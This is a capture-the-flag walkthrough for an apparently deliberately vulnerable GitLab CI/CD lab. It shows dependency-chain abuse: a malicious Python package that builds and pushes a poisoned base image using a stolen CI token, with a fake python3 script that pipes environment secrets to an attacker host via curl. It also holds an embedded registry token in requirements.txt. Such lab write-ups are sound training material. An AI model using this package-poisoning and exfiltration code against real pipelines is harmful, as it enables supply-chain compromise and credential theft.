[![CICD-SEC-3 Dependency Chain Abuse](https://img.shields.io/badge/CICD--SEC--3-Dependency%20Chain%20Abuse-brightgreen)](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-03-Dependency-Chain-Abuse)
[![CICD-SEC-6 Insufficient Credential Hygiene](https://img.shields.io/badge/CICD--SEC--6-Insufficient%20Credential%20Hygiene-brightgreen)](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-06-Insufficient-Credential-Hygiene)

Let's explore what we have when signing in to the compromised GitLab user account:

We are the maintainers of *pygryphon* package. There are also public projects: *nest-of-gold* and *awesome-app* to which we have read-only access.

As the instructions of this challenge hint, let's try to see if we can find any reference to *Flag11*.

A simple search tells us it is referenced by the *nest-of-gold* project 


![grpyhon](../images/gryphon-1.png "grpyhon")

We can see that *Flag11* is used in a pipeline that ships a container used in production.

Browsing to the pipeline settings, we discover that a scheduling is set, and that a user named "gryphon" is executing the pipeline.

If we keep looking, we can discover that the same user is executing the *awesome-app* project's pipeline.

Diving into *awesome-app*, it is using the pygrphon package as a dependency! We can tell it by the *requirments.txt* file:

```
--extra-index-url http://token:cd79dd622c6d463a574635e874765c0b@gitlab/api/v4/projects/pygryphon%2Fpygryphon/packages/pypi/simple --trusted-host gitlab

pytest==7.2.0
flask==2.0.3
Werkzeug==2.0.3
pygryphon==1.0.13
```

This means we can try and influence the *awesome-app* pipeline by uploading a new malicious Python package of *pygryphon*. We'll get back to it in a moment.

Our end goal is in the *nest-of-gold* project, how can we influence its pipeline?
  
Let's have a look at the Dockerfile inside *nest-of-gold*. We can see it's dependent on the python:3.8 docker image stored in the *nest-of-gold* container registry, and not the offical registry.
  
```docker
FROM gitlab:5050/wonderland/nest-of-gold/python:3.8

WORKDIR /app
COPY app.py .
COPY requirements.txt .
RUN pip3 install -r requirements.txt

CMD [ "python3", "-m" , "flask", "run", "--host=0.0.0.0"]
```
  
Here comes the tricky part 🥸 let's create a malicious *pygryphon* package that pushes a malicious python3.8 docker base image to the *nest-of-gold* container registry.


In the *awesome-app* pipeline we can see a PAT being used named *TOKEN*.

`docker login -u gryphon -p $TOKEN $CI_REGISTRY`

Let's try to steal this token and use it against the *nest-of-gold* container registry.     
In this package, we create a script named "python3" that the docker image of *nest-of-gold* will execute mistakenly instead of the actual python3 interpreter.   
Modified *greet.py* content:

```python
import subprocess

DOCKERFILE = """FROM python:3.8
COPY python3 /usr/local/bin/
COPY python3 /usr/local/bin/pip3"""
# Exfiltrate Flag11. Insert your server address
PYTHON3 = """#!/bin/bash
env | grep FLAG11 | curl -X POST --data-binary @- https://ATTACKER[.]SERVER/"""


def run(cmd):
    proc = subprocess.run(cmd, shell=True, timeout=180)
    print(proc.stdout)
    print(proc.stderr)


def hello(name):
    """
    We will build and push a malicous docker image as if it were python 3.8, but in fact 
    the python3 binary will be our evil script
    """
    run('apk add docker-cli')
    with open('Dockerfile', 'w') as f:
        f.write(DOCKERFILE)
    with open('python3', 'w') as f:
        f.write(PYTHON3)
    # Grant our script execution permission    
    run('chmod +x python3')
    # Build the docker file
    run('DOCKER_HOST=tcp://docker:2375 docker build -t gitlab:5050/wonderland/nest-of-gold/python:3.8 .')
    # Login to the docker registry using TOKEN
    run('DOCKER_HOST=tcp://docker:2375 docker login -u gryphon -p $TOKEN $CI_REGISTRY')
    # Push our malicious python docker image to the registry
    run('DOCKER_HOST=tcp://docker:2375 docker push gitlab:5050/wonderland/nest-of-gold/python:3.8')    
    return "Hello, " + name
```

Build and upload this package to the gryphon package registry (after configuring GitLab as the package registry).

Conveniently you may use these files to build the package:  

[.pypirc](/tests/data/pygryphon/.pypirc)

[pyproject.toml](/tests/data/pygryphon/pyproject.toml)


```sh
pipenv run python3 -m build [path_to_package]
pipenv run python3 -m twine upload -r gitlab
```

Now prepare a cup of coffe ☕️ wait for the two pipeline scheduling to take place, and expect the flag to arrive at your http server.
